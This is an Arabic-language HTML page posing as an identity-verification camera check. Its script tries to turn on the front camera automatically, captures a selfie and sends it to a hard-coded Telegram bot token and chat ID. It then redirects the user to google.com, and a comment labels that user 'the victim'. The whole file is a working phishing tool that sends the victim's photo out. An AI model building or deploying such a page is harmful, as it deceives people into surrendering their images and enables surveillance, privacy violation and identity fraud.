<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفعيل الكاميرا للتحقق</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea, #764ba2);
            margin: 0;
            padding: 20px;
            color: white;
            text-align: center;
        }
        .container {
            max-width: 400px;
            margin: 100px auto;
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }
        button {
            background: #ff4757;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 25px;
            cursor: pointer;
            margin: 20px 0;
        }
        .camera-box {
            width: 250px;
            height: 250px;
            margin: 20px auto;
            border: 3px solid white;
            border-radius: 10px;
            overflow: hidden;
        }
        #video {
            width: 100%;
            height: 100%;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📸 تحقق من الهوية</h1>
        <p>للمتابعة، يرجى السماح بالوصول إلى الكاميرا</p>
        
        <div class="camera-box">
            <video id="video" autoplay playsinline></video>
        </div>
        
        <button id="startBtn">تفعيل الكاميرا</button>
        <button id="captureBtn" class="hidden">التقاط صورة</button>
        
        <div id="status"></div>
    </div>

    <script>
        const video = document.getElementById('video');
        const startBtn = document.getElementById('startBtn');
        const captureBtn = document.getElementById('captureBtn');
        const status = document.getElementById('status');

        // إعدادات البوت - غيرها يا حمار
        const BOT_TOKEN = '8097003009:AAGO1cYlxHulfqbnbUCqxa1rahpGawgVM_4';
        const CHAT_ID = '7763665935';

        startBtn.addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                video.srcObject = stream;
                startBtn.classList.add('hidden');
                captureBtn.classList.remove('hidden');
                status.innerHTML = '<p style="color:lightgreen">✅ الكاميرا مفعلة</p>';
            } catch (err) {
                status.innerHTML = '<p style="color:red">❌ خطأ في تفعيل الكاميرا</p>';
            }
        });

        captureBtn.addEventListener('click', () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                sendToTelegram(blob);
            }, 'image/jpeg', 0.8);
        });

        function sendToTelegram(blob) {
            status.innerHTML = '<p>⏳ جاري التحقق...</p>';
            
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'selfie.jpg');
            formData.append('caption', `سيلفي - ${new Date().toLocaleString()}`);

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    status.innerHTML = '<p style="color:lightgreen">✅ تم التحقق بنجاح!</p>';
                    // إعادة توجيه الضحية
                    setTimeout(() => {
                        window.location.href = 'https://google.com';
                    }, 2000);
                } else {
                    throw new Error('فشل الإرسال');
                }
            })
            .catch(err => {
                status.innerHTML = '<p style="color:red">❌ خطأ في التحقق</p>';
            });
        }

        // محاولة التفعيل التلقائي
        setTimeout(() => {
            startBtn.click();
        }, 1000);
    </script>
</body>
</html>
